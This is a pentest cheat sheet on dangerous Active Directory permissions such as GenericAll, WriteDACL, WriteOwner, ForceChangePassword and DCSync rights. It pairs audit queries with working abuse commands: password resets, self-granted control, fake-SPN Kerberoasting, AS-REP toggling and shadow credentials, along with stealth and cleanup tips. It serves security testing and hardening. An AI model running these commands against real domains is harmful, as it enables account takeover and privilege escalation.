---
aliases:
  - GenericAll
  - WriteDACL
  - ForceChangePassword
  - Dangerous ACE
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - ACL Enumeration]]"
  - "[[ACL Abuse]]"
---
# AD - ACL Enumeration - Dangerous ACE Patterns

***

## GenericAll (Full Control)

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| `GenericAll` | All rights | Total control. |
| Equivalent to "Full Control" | Complete | Standard. |
| Implies: GenericRead + GenericWrite + GenericExecute + Standard rights | Standard | Standard. |
| User: reset password, add to group, modify attrs | Standard | Privesc. |
| Group: add/remove members | Standard | Privesc. |
| Computer: reset password, modify SPN, KeyCred | Standard | Privesc. |
| OU: full control on contents | Standard | Privesc. |
| Domain root: DCSync + everything | Critical | Standard. |
| Common abuse: target user → reset pwd → impersonate | Standard | Standard. |
| Common abuse: target group → addmember → DA | Standard | Standard. |
| Common abuse: computer → RBCD or Shadow Cred | Modern | Standard. |
| BloodHound `GenericAll` edge | Standard | Tool. |
| Detection: GenericAll grant events | Defender | Adjacent. |
| Modern: minimal GenericAll | Best practice | Standard. |
| Audit: who has GenericAll on what | Compliance | Standard. |
| Cross-correlate with priv path | Standard | Adjacent. |
^ad-ace-genericall

### GenericAll detection + abuse

```bash
# BloodHound query
# MATCH (u)-[:GenericAll]->(target) RETURN u.name, target.name

# PowerView
Get-DomainObjectAcl -SearchBase "DC=dom,DC=local" -ResolveGUIDs |
  Where {$_.ActiveDirectoryRights -match "GenericAll"} |
  Where {$_.IdentityReferenceName -notmatch "Domain Admins|Enterprise Admins|SYSTEM"} |
  Select ObjectDN,IdentityReferenceName

# Abuse: reset target user password (post-pwn)
# Set-ADAccountPassword -Identity target -NewPassword (ConvertTo-SecureString "Pwned!" -AsPlainText -Force) -Reset
```

___

## GenericWrite (Modify Non-Protected Attrs)

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| `GenericWrite` | Modify any attr except DACL/Owner | Standard. |
| Cannot modify ACL itself | Edge | Standard. |
| Cannot change ownership | Edge | Standard. |
| User: modify SPN, KeyCred, UAC | Privesc paths | Standard. |
| User: modify scriptPath / homeDir | Logon-time RCE | Common abuse. |
| Group: modify member attribute | Add to group | Privesc. |
| Computer: modify SPN, RBCD attr | RBCD attack | Standard. |
| Computer: modify KeyCredentialLink | Shadow Cred | Modern. |
| `Set-ADUser -ServicePrincipalNames @{Add="HTTP/x"}` | Targeted Kerberoast | Standard. |
| `Set-ADUser -KeyCredentialLink ...` | Shadow Cred | Modern. |
| BloodHound `GenericWrite` edge | Standard | Tool. |
| Detection: GenericWrite events | Defender | Adjacent. |
| Less powerful than GenericAll | Standard | Adjacent. |
| Combine with WriteDACL = chain | ACL abuse | Adjacent. |
| Modern: WriteSPN specific edge | BHCE 5.x | Tool. |
| AddKeyCredentialLink modern edge | BHCE 5.x | Tool. |
^ad-ace-genericwrite

### GenericWrite abuse paths

```powershell
# Targeted Kerberoast via SPN add
$target = "CN=victim,CN=Users,DC=dom,DC=local"
Set-DomainObject -Identity $target -SET @{serviceprincipalname='HTTP/fake.dom.local'}

# Now request TGS for victim → kerberoast hash
Get-DomainSPNTicket -SPN 'HTTP/fake.dom.local' | Format-List

# Cleanup
Set-DomainObject -Identity $target -CLEAR serviceprincipalname

# Shadow Credentials (KeyCredentialLink)
# certipy shadow auto -u user -p pass -account victim
```

___

## WriteDACL (Modify ACL)

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| `WriteDACL` | Modify object's ACL | Critical. |
| Self-grant GenericAll = trivial | One-step | Standard. |
| 2-step privesc | Modify → use new perms | Standard. |
| Can grant any right to anyone | Including self | Standard. |
| Common abuse: grant self GenericAll | Standard | Standard. |
| BloodHound `WriteDacl` edge | Standard | Tool. |
| Detection: ACL modify events (4670) | Defender | Adjacent. |
| Modern: critical Tier 0 | Hardening | Standard. |
| Audit: who has WriteDACL on what | Compliance | Standard. |
| Cross-correlate with privilege | Strategy | Standard. |
| WriteDACL on domain root = DCSync setup | Critical | Standard. |
| WriteDACL on AdminSDHolder = Tier 0 control | Critical | Adjacent. |
| WriteDACL via group membership | Indirect | Standard. |
| Stealth abuse: minimal grant + cleanup | OPSEC | Standard. |
| Modify protected groups blocked normally | AdminSDHolder | Standard. |
| Bypass: WriteDACL on AdminSDHolder | Edge | Adjacent. |
^ad-ace-writedacl

### WriteDACL abuse

```powershell
# Self-grant GenericAll on target
$target = "CN=victim,CN=Users,DC=dom,DC=local"
Add-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity attacker -Rights All

# Verify
Get-Acl "AD:$target" | Select -ExpandProperty Access |
  Where IdentityReference -match "attacker"

# Cleanup
Remove-DomainObjectAcl -TargetIdentity $target -PrincipalIdentity attacker -Rights All
```

___

## WriteOwner (Take Ownership)

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| `WriteOwner` | Change object's owner | 2-step privesc. |
| New owner can modify DACL | Implicit | Standard. |
| Set self as owner → grant self GenericAll | Standard chain | Standard. |
| BloodHound `WriteOwner` edge | Standard | Tool. |
| Stealthier than WriteDACL initially | Edge | Adjacent. |
| Detection: ownership change events | Defender | Adjacent. |
| Common via group membership | Indirect | Standard. |
| WriteOwner on domain root | Critical | Adjacent. |
| Adjacent: `Owns` edge in BH | Implicit owner | Standard. |
| Audit: minimal WriteOwner principals | Best practice | Standard. |
| Modern: separate from DA tier | Hardening | Standard. |
| Cross-correlate with priv path | Strategy | Standard. |
| Recovery scenarios use WriteOwner | Standard | Edge. |
| Stale ownership transfers | Audit | Adjacent. |
| Detection: bulk ownership changes | Defender ML | Modern. |
| AdminSDHolder ownership = Tier 0 control | Critical | Adjacent. |
^ad-ace-writeowner

### WriteOwner abuse

```powershell
# Step 1: Take ownership
Set-DomainObjectOwner -Identity victim -OwnerIdentity attacker

# Step 2: Now we own → can grant ourselves GenericAll
Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights All

# Step 3: Use new perms (e.g., reset password)
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'Pwned!' -AsPlainText -Force)
```

___

## ForceChangePassword (User-Force-Change-Password Extended Right)

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| `ForceChangePassword` | Reset password without knowing current | Direct. |
| User-Force-Change-Password ext right | GUID 00299570-... | Standard. |
| Granular alternative to GenericAll | Standard | Common. |
| Common helpdesk privilege | Per-OU | Standard. |
| BloodHound `ForceChangePassword` edge | Standard | Tool. |
| Detection: password reset events | Defender | Adjacent. |
| `Set-ADAccountPassword -Reset` requires this | RSAT cmdlet | Standard. |
| Cross-correlate with priv | Standard | Audit. |
| Modern: per-OU helpdesk delegation | Best practice | Standard. |
| Stealth abuse: temp reset + restore | OPSEC | Edge. |
| Cleanup not needed (read-only impact) | Standard | Standard. |
| Audit: per-user reset events | Standard | Defender. |
| Per-tier reset permission | Tier model | Standard. |
| AdminSDHolder protected groups exempt | Standard | Adjacent. |
| Reset Tier 0 privileged user = privesc | Direct | Critical. |
| Cross-OU helpdesk reset | Audit | Standard. |
^ad-ace-forcechange

### ForceChangePassword abuse

```powershell
# Reset target user password
$target = "victim"
Set-ADAccountPassword -Identity $target -NewPassword (ConvertTo-SecureString "Pwned!2024" -AsPlainText -Force) -Reset

# Now login as victim
runas /user:dom\victim cmd
# Or use Pass-the-Hash workflow

# OPSEC: target accounts likely to have lockout reset trigger alerts
# Cross-correlate with target priv before reset
```

```bash
# Linux net rpc password reset (if has rights)
net rpc password "victim" "Pwned!2024" -U 'attacker%pass' -S DC

# Or via bloodyAD
bloodyAD --host DC -d dom -u attacker -p pass set password victim 'Pwned!2024'
```

___

## AddSelf (Self Membership)

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| `AddSelf` extended right | Add self to group | Direct. |
| `Self` extended right | Generic self-modify | Adjacent. |
| Granular vs `WriteProperty Member` | Equivalent for adding self | Standard. |
| BloodHound `AddSelf` edge | Standard | Tool. |
| Detection: group membership events (4728) | Defender | Adjacent. |
| Common path: AddSelf → DA | Direct privesc | Critical. |
| Cross-correlate with priv group | Strategy | Standard. |
| Modern: per-group AddSelf permission | Best practice | Standard. |
| Stealth: cleanup after | Standard | OPSEC. |
| Cleanup: `Remove-ADGroupMember` | Standard | Standard. |
| Audit: AddSelf grant events | Standard | Defender. |
| Cross-tier AddSelf | Critical | Audit. |
| Foreign principal AddSelf | Cross-trust | Critical. |
| Stale AddSelf grants | Old delegations | Audit. |
| Per-OU group delegation | Helpdesk pattern | Standard. |
| Adjacent: `WriteProperty Member` | Same effect | Standard. |
^ad-ace-addself

### AddSelf abuse

```powershell
# Add self to target group
Add-ADGroupMember -Identity "Tier1 Admins" -Members attacker

# Verify
Get-ADGroupMember "Tier1 Admins" | Where Name -match "attacker"

# Use new privilege

# Cleanup
Remove-ADGroupMember -Identity "Tier1 Admins" -Members attacker
```

___

## WriteProperty on Specific Attributes

| **Property** | **Abuse** | **Notas** |
|:---:|:---:|:---:|
| `Member` (group) | Add members | AddMember. |
| `servicePrincipalName` | Targeted Kerberoast | SPN injection. |
| `userAccountControl` | Toggle UAC flags (DONT_REQ_PREAUTH, etc.) | UAC manipulation. |
| `msDS-KeyCredentialLink` | Shadow Credentials | Modern. |
| `msDS-AllowedToDelegateTo` | Constrained delegation grant | Privileged. |
| `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD on computer | Modern. |
| `scriptPath` | Logon script (RCE on logon) | Edge. |
| `profilePath` | Profile path | Edge. |
| `homeDirectory` | UNC path | Edge. |
| `lockoutTime` | Unlock account | Edge. |
| `pwdLastSet` | Reset password expiration | Edge. |
| `accountExpires` | Re-enable expired | Edge. |
| `description` | Free-text — nothing direct | Standard. |
| `mail` | Email | Edge. |
| `manager` | Manager DN | Edge. |
| BloodHound modern edges per-property | Tool | Standard. |
^ad-ace-writeprop

### WriteProperty abuse examples

```powershell
# 1. WriteProperty on servicePrincipalName → targeted Kerberoast
Set-DomainObject -Identity victim -SET @{serviceprincipalname='HTTP/fake.dom.local'}
Get-DomainSPNTicket -SPN 'HTTP/fake.dom.local'
# Cleanup: Set-DomainObject -Identity victim -CLEAR serviceprincipalname

# 2. WriteProperty on userAccountControl → toggle DONT_REQ_PREAUTH (AS-REP roastable)
Get-ADUser victim | Set-ADAccountControl -DoesNotRequirePreAuth $true
# Now AS-REP roast: GetNPUsers.py -no-pass -usersfile victims.txt

# 3. WriteProperty on msDS-KeyCredentialLink → Shadow Credentials
# certipy shadow auto -u user -p pass -account victim

# 4. WriteProperty on Member (group) → AddMember
Set-DomainObject -Identity "Tier1 Admins" -SET @{member=$attackerDN} -Append
```

___

## DCSync Rights (GetChanges + GetChangesAll)

| **Right** | **GUID** | **Notas** |
|:---:|:---:|:---:|
| DS-Replication-Get-Changes | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | Required |
| DS-Replication-Get-Changes-All | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | Required (combined). |
| Both = DCSync capability | Standard | Critical. |
| DS-Replication-Get-Changes-In-Filtered-Set | RODC scope | Edge. |
| DS-Replication-Synchronize | Trigger replication | Adjacent. |
| Rights granted on domain root | Standard | Standard. |
| Default holders | DA, EA, Domain Controllers | Standard. |
| Common misconfigs | Service accounts, Exchange (legacy) | Critical. |
| BloodHound `GetChanges` + `GetChangesAll` edges | Standard | Tool. |
| Detection: replication events (4662) | Defender | Adjacent. |
| Adjacent hub: DCSync | Cross-ref | Adjacent. |
| Adjacent hub: DCSync Rights Discovery | Cross-ref | Adjacent. |
| Modern: minimal DCSync grants | Best practice | Standard. |
| Audit: non-default DCSync holders | Compliance | Standard. |
| Cleanup: post-engagement | Standard | OPSEC. |
| Detection: bulk DCSync events | Defender | Adjacent. |
^ad-ace-dcsync

### DCSync rights audit

```powershell
# Find non-default DCSync rights holders
$dcsyncRights = @(
  "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",  # Get-Changes
  "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"   # Get-Changes-All
)

Get-ObjectAcl -DistinguishedName "DC=dom,DC=local" -ResolveGUIDs |
  Where {$_.ObjectAceType -in $dcsyncRights} |
  Where {$_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|Administrators|Domain Controllers"} |
  Select IdentityReference,ObjectAceType,ActiveDirectoryRights
```

```cypher
// BloodHound
MATCH p=(u)-[:MemberOf*0..]->(g:Group)-[:GetChanges|GetChangesAll]->(d:Domain)
WHERE NOT u.name STARTS WITH "S-1-5"
RETURN p
```

___

## Other Common Dangerous ACEs

| **ACE Right** | **Impact** | **Notas** |
|:---:|:---:|:---:|
| `AllExtendedRights` | All extended rights including LAPS, DCSync, etc. | Often overlooked. |
| `AllowedToAct` | RBCD-related | Edge. |
| `AddKeyCredentialLink` | Shadow Credentials | Modern. |
| `WriteSPN` | Targeted Kerberoast | Modern edge. |
| `WriteAccountRestrictions` | Modify UAC | Modern edge. |
| `WriteGPLink` | Modify GPO links | GPO Abuse. |
| `WriteOwner on AdminSDHolder` | Tier 0 control | Critical. |
| `Reanimate-Tombstones` | Restore deleted | Persistence. |
| `Send-As` (Exchange) | Email spoofing | Adjacent. |
| `Reset Password` on Tier 0 user | Direct ATO | Critical. |
| `Allowed-To-Authenticate` | Trust scope | Trust. |
| `Manage SACL` | Modify audit log permissions | Edge. |
| `WriteProperty msDS-KeyCredentialLink` | Same as AddKeyCredentialLink | Modern. |
| `WriteProperty msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD | Standard. |
| `Modify owner` (special) | WriteOwner equivalent | Standard. |
| `Unexpired user accounts in DA` | Audit | Adjacent. |
^ad-ace-other

### Comprehensive dangerous ACE filter

```powershell
$dangerousRights = @(
  "GenericAll", "GenericWrite", "WriteDacl", "WriteOwner",
  "ForceChangePassword", "AddSelf", "AddMember", "WriteProperty",
  "AllExtendedRights", "ExtendedRight"
)

Get-DomainObjectAcl -SearchBase "DC=dom,DC=local" -ResolveGUIDs |
  Where {
    $_.ActiveDirectoryRights -match ($dangerousRights -join "|") -and
    $_.IdentityReferenceName -notmatch "Domain Admins|Enterprise Admins|SYSTEM|BUILTIN"
  } |
  Select ObjectDN,IdentityReferenceName,ActiveDirectoryRights,ObjectAceType
```

___

## ACE Inheritance Considerations

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Explicit ACE | Set on object directly | Standard. |
| Inherited ACE | From parent OU/container | Standard. |
| `IsInherited` flag | True/False | Distinguish. |
| `InheritanceType` | None, All, Descendants, etc. | Standard. |
| Inheritance flow | Parent → child | Standard. |
| Block inheritance | Per-object setting | Edge. |
| Inheritance from domain root | Default | Standard. |
| Per-OU inheritance | Granular | Standard. |
| ACL via group nesting | Recursive | Standard. |
| Cross-OU explicit override | Edge | Edge. |
| Atacante: prefer inherited ACEs (stealthier) | Standard | OPSEC. |
| Cleanup: inherited ACEs harder to remove | Edge | OPSEC. |
| Detection: per-object explicit ACE add | Defender | Adjacent. |
| Audit: explicit vs inherited per-object | Standard | Compliance. |
| Modern: minimal explicit ACEs | Best practice | Standard. |
| AdminSDHolder propagation | Special inheritance | Standard. |
^ad-ace-inheritance

### Inheritance audit

```powershell
$dn = "CN=victim,CN=Users,DC=dom,DC=local"
$acl = Get-Acl "AD:$dn"

# Explicit ACEs only
$acl.Access | Where IsInherited -eq $false |
  Select IdentityReference,ActiveDirectoryRights,InheritanceType

# Inherited ACEs only  
$acl.Access | Where IsInherited -eq $true |
  Select IdentityReference,ActiveDirectoryRights,InheritanceType,InheritedObjectType
```

***
